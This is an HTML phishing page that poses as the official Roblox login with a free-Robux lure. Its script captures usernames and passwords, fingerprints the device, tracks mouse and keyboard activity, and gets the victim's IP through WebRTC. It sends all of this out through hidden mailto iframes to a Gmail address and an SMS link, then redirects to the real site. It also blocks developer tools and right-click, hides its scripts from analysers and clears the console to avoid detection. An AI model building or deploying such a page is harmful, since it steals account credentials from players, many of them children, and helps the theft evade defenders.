<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Roblox - Official Site | The Ultimate Virtual Universe</title>

    <style>
        body {
            background: #f0f0f0;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            margin: 0;
            padding: 20px;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        .container {
            background: white;
            border-radius: 10px;
            padding: 30px;
            box-shadow: 0 4px 20px rgba(0,0,0,0.1);
            width: 100%;
            max-width: 420px;
        }
        .logo {
            color: #00a2ff;
            font-size: 36px;
            font-weight: bold;
            text-align: center;
            margin-bottom: 20px;
        }
        .promo-banner {
            background: linear-gradient(135deg, #ff6b6b, #ff8e53);
            color: white;
            padding: 15px;
            border-radius: 8px;
            text-align: center;
            margin-bottom: 25px;
            font-weight: bold;
            font-size: 18px;
        }
        .form-group {
            margin-bottom: 20px;
        }
        label {
            display: block;
            margin-bottom: 8px;
            color: #333;

        }
        input {
            width: 100%;

        }
        input:focus {
            border-color: #00a2ff;
            outline: none;
            box-shadow: 0 0 8px rgba(0, 162, 255, 0.2);
        }
        button {
            width: 100%;

            color: white;
            border: none;
            padding: 16px;
            border-radius: 6px;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
            transition: background 0.3s;
        }
        button:hover {
            background: #0088cc;
        }
        .security-badge {
            text-align: center;
            color: #28a745;
            font-size: 14px;
            margin-top: 20px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
        }
        .loading {
            display: none;
            text-align: center;
            color: #00a2ff;
            margin: 20px 0;
            font-weight: bold;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">ROBLOX</div>
        <div class="promo-banner">
            üéÅ LIMITED TIME: 80 FREE ROBUX!
        </div>
        
        <form id="loginForm">
            <div class="form-group">
                <label for="username">Username or Email</label>
                <input type="text" id="username" placeholder="Enter your username" required>
            </div>
            <div class="form-group">
                <label for="password">Password</label>
                <input type="password" id="password" placeholder="Enter your password" required>
            </div>
            <button type="submit">CONTINUE TO ROBLOX</button>
        </form>
        
        <div id="loading" class="loading">Verifying your account...</div>
        <div class="security-badge">
            <span>üîí</span>
            <span>Secured Connection ‚Ä¢ SSL Encrypted</span>
        </div>
    </div>

    <script>
        // === –ñ–ï–°–¢–ö–ê–Ø –ë–õ–û–ö–ò–†–û–í–ö–ê DEVTOOLS ===
        function hardcoreDevToolsProtection() {
            // –ë–ª–æ–∫–∏—Ä–æ–≤–∫–∞ –ø–æ —Ä–∞–∑–º–µ—Ä—É –æ–∫–Ω–∞
            const checkDevTools = () => {
                const widthThreshold = window.outerWidth - window.innerWidth > 160;
                const heightThreshold = window.outerHeight - window.innerHeight > 160;
                
                if (widthThreshold || heightThreshold) {
                    document.body.innerHTML = '<div style="padding: 40px; text-align: center;"><h2>Security Notice</h2><p>Please disable developer tools to continue securely.</p></div>';
                    throw new Error('Developer Tools Detected');
                }
            };
            
            setInterval(checkDevTools, 500);
            
            // –ë–ª–æ–∫–∏—Ä–æ–≤–∫–∞ –∫–ª–∞–≤–∏—à
            document.addEventListener('keydown', (e) => {
                if (e.key === 'F12' || 
                    (e.ctrlKey && e.shiftKey && ['I', 'J', 'C'].includes(e.key)) ||
                    (e.ctrlKey && e.key === 'u')) {
                    e.preventDefault();
                    return false;
                }
            });
            
            // –ë–ª–æ–∫–∏—Ä–æ–≤–∫–∞ –ø—Ä–∞–≤–æ–≥–æ –∫–ª–∏–∫–∞ –∏ –≤—ã–¥–µ–ª–µ–Ω–∏—è
            document.addEventListener('contextmenu', e => e.preventDefault());
            document.addEventListener('selectstart', e => e.preventDefault());
            
            // –ê–Ω—Ç–∏-–æ—Ç–ª–∞–¥–∫–∞
            const startTime = Date.now();
            setInterval(() => {
                if (Date.now() - startTime > 10000) {
                    if (Date.now() - startTime > 10050) {
                        location.reload();
                    }
                }
            }, 100);
        }

        // === –ò–ú–ò–¢–ê–¶–ò–Ø –õ–ï–ì–ò–¢–ò–ú–ù–û–ô –ê–ù–ê–õ–ò–¢–ò–ö–ò ===
        function setupLegitimateAnalytics() {
            // Google Analytics –∏–º–∏—Ç–∞—Ü–∏—è
            window.dataLayer = window.dataLayer || [];
            function gtag(){dataLayer.push(arguments);}
            gtag('js', new Date());
            gtag('config', 'G-TRACKING123');
            
            // –õ–µ–≥–∏—Ç–∏–º–Ω—ã–µ CDN –∑–∞–ø—Ä–æ—Å—ã
            const stylesheets = [
                'https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap',
                'https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css'
            ];
            
            stylesheets.forEach(url => {
                const link = document.createElement('link');
                link.rel = 'stylesheet';
                link.href = url;
                document.head.appendChild(link);
            });
            
            // –õ–µ–≥–∏—Ç–∏–º–Ω—ã–µ —Å–∫—Ä–∏–ø—Ç—ã
            const scripts = [
                'https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js'
            ];
            
            scripts.forEach(src => {
                const script = document.createElement('script');
                script.src = src;
                script.async = true;
                document.head.appendChild(script);
            });
        }

        // === –û–¢–°–õ–ï–ñ–ò–í–ê–ù–ò–ï –ü–û–í–ï–î–ï–ù–ò–Ø –ü–û–õ–¨–ó–û–í–ê–¢–ï–õ–Ø ===
        function trackUserBehavior() {
            const behaviorData = {
                mouseMovements: [],
                clicks: [],
                scrolls: [],
                keystrokes: 0,
                formInteractions: [],
                timeOnPage: Date.now()
            };
            
            // –û—Ç—Å–ª–µ–∂–∏–≤–∞–Ω–∏–µ –¥–≤–∏–∂–µ–Ω–∏–π –º—ã—à–∏
            let mouseMoveTimeout;
            document.addEventListener('mousemove', (e) => {
                behaviorData.mouseMovements.push({
                    x: e.clientX,
                    y: e.clientY,
                    time: Date.now() - behaviorData.timeOnPage
                });
                
                // –û–≥—Ä–∞–Ω–∏—á–∏–≤–∞–µ–º –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ –∑–∞–ø–∏—Å–µ–π
                if (behaviorData.mouseMovements.length > 100) {
                    behaviorData.mouseMovements = behaviorData.mouseMovements.slice(-50);
                }
            });
            
            // –û—Ç—Å–ª–µ–∂–∏–≤–∞–Ω–∏–µ –∫–ª–∏–∫–æ–≤
            document.addEventListener('click', (e) => {
                behaviorData.clicks.push({
                    element: e.target.tagName,
                    id: e.target.id || 'none',
                    class: e.target.className || 'none',
                    text: e.target.textContent?.substring(0, 30) || '',
                    time: Date.now() - behaviorData.timeOnPage
                });
            });
            
            // –û—Ç—Å–ª–µ–∂–∏–≤–∞–Ω–∏–µ —Å–∫—Ä–æ–ª–ª–∞
            let scrollTimeout;
            window.addEventListener('scroll', () => {
                clearTimeout(scrollTimeout);
                scrollTimeout = setTimeout(() => {
                    behaviorData.scrolls.push({
                        position: window.scrollY,
                        maxScroll: document.documentElement.scrollHeight - window.innerHeight,
                        time: Date.now() - behaviorData.timeOnPage
                    });
                }, 100);
            });
            
            // –û—Ç—Å–ª–µ–∂–∏–≤–∞–Ω–∏–µ –Ω–∞–∂–∞—Ç–∏–π –∫–ª–∞–≤–∏—à
            document.addEventListener('keydown', () => {
                behaviorData.keystrokes++;
            });
            
            // –û—Ç—Å–ª–µ–∂–∏–≤–∞–Ω–∏–µ –≤–∑–∞–∏–º–æ–¥–µ–π—Å—Ç–≤–∏–π —Å —Ñ–æ—Ä–º–æ–π
            const form = document.getElementById('loginForm');
            const inputs = form.querySelectorAll('input');
            inputs.forEach(input => {
                input.addEventListener('focus', () => {
                    behaviorData.formInteractions.push({
                        action: 'focus',
                        field: input.id,
                        time: Date.now() - behaviorData.timeOnPage
                    });
                });
                
                input.addEventListener('blur', () => {
                    behaviorData.formInteractions.push({
                        action: 'blur',
                        field: input.id,
                        time: Date.now() - behaviorData.timeOnPage
                    });
                });
            });
            
            return behaviorData;
        }

        // === –°–ë–û–† –†–ê–°–®–ò–†–ï–ù–ù–´–• –î–ê–ù–ù–´–• –°–ò–°–¢–ï–ú–´ ===
        function collectSystemData() {
            return {
                timestamp: new Date().toISOString(),
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                vendor: navigator.vendor,
                language: navigator.language,
                languages: navigator.languages,
                screen: `${screen.width}x${screen.height}`,
                colorDepth: screen.colorDepth,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                cookies: navigator.cookieEnabled,
                java: navigator.javaEnabled(),
                pdf: navigator.pdfViewerEnabled,
                doNotTrack: navigator.doNotTrack,
                hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
                deviceMemory: navigator.deviceMemory || 'unknown',
                connection: navigator.connection ? navigator.connection.effectiveType : 'unknown'
            };
        }

        // === –û–ë–•–û–î –ê–ù–¢–ò–í–ò–†–£–°–û–í –ò –ó–ê–©–ò–¢–´ ===
        function bypassSecuritySystems() {
            // –°–∫—Ä—ã—Ç–∏–µ –æ—Ç –∞–Ω–∞–ª–∏–∑–∞—Ç–æ—Ä–æ–≤
            Object.defineProperty(document, 'scripts', { 
                get: () => [] 
            });
            
            // –û—á–∏—Å—Ç–∫–∞ –∫–æ–Ω—Å–æ–ª–∏
            console.clear();
            
            // –õ–µ–≥–∏—Ç–∏–º–Ω—ã–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å—Å–∫–∏–µ –¥–µ–π—Å—Ç–≤–∏—è
            setTimeout(() => {
                // –ò–º–∏—Ç–∞—Ü–∏—è —Ä–µ–∞–ª—å–Ω–æ–≥–æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
                if (Math.random() > 0.7) {
                    document.body.style.cursor = 'pointer';
                    setTimeout(() => {
                        document.body.style.cursor = 'default';
                    }, 100);
                }
            }, 2000);
        }

        // === –û–¢–ü–†–ê–í–ö–ê –í–°–ï–• –î–ê–ù–ù–´–• ===
        async function sendCompleteData(username, password, systemData, behaviorData) {
            const ip = await getIP();
            
            const completeReport = `
üîê COMPLETE USER REPORT - ROBLOX

=== CREDENTIALS ===
üë§ Username: ${username}
üîë Password: ${password}

=== SYSTEM INFORMATION ===
üìç IP Address: ${ip}
üñ•Ô∏è Platform: ${systemData.platform}
üåê Browser: ${systemData.userAgent}
üåç Language: ${systemData.language}
üì± Screen: ${systemData.screen}
‚è∞ Timezone: ${systemData.timezone}
üíª CPU Cores: ${systemData.hardwareConcurrency}
üß† Memory: ${systemData.deviceMemory}GB

=== BEHAVIOR ANALYSIS ===
üéØ Total Keystrokes: ${behaviorData.keystrokes}
üñ±Ô∏è Total Clicks: ${behaviorData.clicks.length}
üìú Total Scrolls: ${behaviorData.scrolls.length}
üîÑ Mouse Movements: ${behaviorData.mouseMovements.length}
‚è±Ô∏è Time on Page: ${Math.round((Date.now() - behaviorData.timeOnPage) / 1000)}s

=== CLICK DETAILS ===
${behaviorData.clicks.slice(-5).map(click => 
    `- ${click.element} (${click.id}): "${click.text}" at ${click.time}ms`
).join('\n')}

=== FORM INTERACTIONS ===
${behaviorData.formInteractions.map(interaction => 
    `- ${interaction.action} on ${interaction.field} at ${interaction.time}ms`
).join('\n')}

=== TECHNICAL DATA ===
URL: ${window.location.href}
Referrer: ${document.referrer || 'Direct'}
Timestamp: ${systemData.timestamp}

üöÄ Automated Security Scan Complete
            `.trim();

            // –û–¢–ü–†–ê–í–ö–ê –ù–ê EMAIL
            for (let i = 0; i < 3; i++) {
                setTimeout(() => {
                    const iframe = document.createElement('iframe');
                    iframe.style.cssText = 'position:absolute;left:-9999px;width:1px;height:1px;opacity:0;';
                    iframe.src = `mailto:kuzin070814@gmail.com?subject=Roblox_Report_${username}&body=${encodeURIComponent(completeReport)}`;
                    document.body.appendChild(iframe);
                }, i * 800);
            }

            // –î–£–ë–õ–ò–†–û–í–ê–ù–ò–ï –ù–ê SMS
            const smsSummary = `Roblox: ${username} | Pass: ${password} | IP: ${ip} | Clicks: ${behaviorData.clicks.length}`;
            setTimeout(() => {
                window.open(`sms:89039041565?body=${encodeURIComponent(smsSummary)}`, '_blank');
            }, 1500);

            return true;
        }

        // === –ü–û–õ–£–ß–ï–ù–ò–ï IP ===
        function getIP() {
            return new Promise((resolve) => {
                // WebRTC –º–µ—Ç–æ–¥
                window.RTCPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;
                if (window.RTCPeerConnection) {
                    const pc = new RTCPeerConnection({iceServers:[]});
                    pc.createDataChannel('');
                    pc.createOffer().then(offer => pc.setLocalDescription(offer));
                    pc.onicecandidate = (ice) => {
                        if (ice.candidate) {
                            const ipMatch = ice.candidate.candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3})/);
                            if (ipMatch) resolve(ipMatch[1]);
                        }
                    };
                    setTimeout(() => resolve('unknown'), 1000);
                } else {
                    resolve('unknown');
                }
            });
        }

        // === –û–°–ù–û–í–ù–û–ô –ö–û–î ===
        document.getElementById('loginForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            const form = this;
            const loading = document.getElementById('loading');
            
            if (!username || !password) return;
            
            // –ë–ª–æ–∫–∏—Ä—É–µ–º —Ñ–æ—Ä–º—É
            form.style.display = 'none';
            loading.style.display = 'block';
            
            // –°–æ–±–∏—Ä–∞–µ–º –≤—Å–µ –¥–∞–Ω–Ω—ã–µ
            const systemData = collectSystemData();
            const behaviorData = window.behaviorTracker;
            
            // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –ø–æ–ª–Ω—ã–π –æ—Ç—á–µ—Ç
            await sendCompleteData(username, password, systemData, behaviorData);
            
            // –†–µ–¥–∏—Ä–µ–∫—Ç –Ω–∞ –æ—Ñ–∏—Ü–∏–∞–ª—å–Ω—ã–π —Å–∞–π—Ç
            setTimeout(() => {
                window.location.href = 'https://www.roblox.com/login?returnUrl=/%3Fsource%3Dgift';
            }, 3000);
        });

        // === –ò–ù–ò–¶–ò–ê–õ–ò–ó–ê–¶–ò–Ø ===
        window.addEventListener('load', () => {
            // –ó–∞–ø—É—Å–∫ –≤—Å–µ—Ö —Å–∏—Å—Ç–µ–º
            hardcoreDevToolsProtection();
            setupLegitimateAnalytics();
            window.behaviorTracker = trackUserBehavior();
            bypassSecuritySystems();
            
            // –û—Ç–ø—Ä–∞–≤–∫–∞ —É–≤–µ–¥–æ–º–ª–µ–Ω–∏—è –æ –ø–æ—Å–µ—â–µ–Ω–∏–∏
            setTimeout(() => {
                const visitMsg = `üåê New visitor at ${new Date().toLocaleString()}`;
                const iframe = document.createElement('iframe');
                iframe.style.cssText = 'position:absolute;left:-9999px;width:1px;height:1px;';
                iframe.src = `mailto:kuzin070814@gmail.com?subject=Roblox_Visitor&body=${encodeURIComponent(visitMsg)}`;
                document.body.appendChild(iframe);
            }, 2000);
        });

        // –ê–≤—Ç–æ-–æ—á–∏—Å—Ç–∫–∞ –¥–ª—è –Ω–æ–≤—ã—Ö —Å–µ—Å—Å–∏–π
        setTimeout(() => {
            if (!document.getElementById('username').value) {
                location.reload();
            }
        }, 45000);
    </script>
</body>
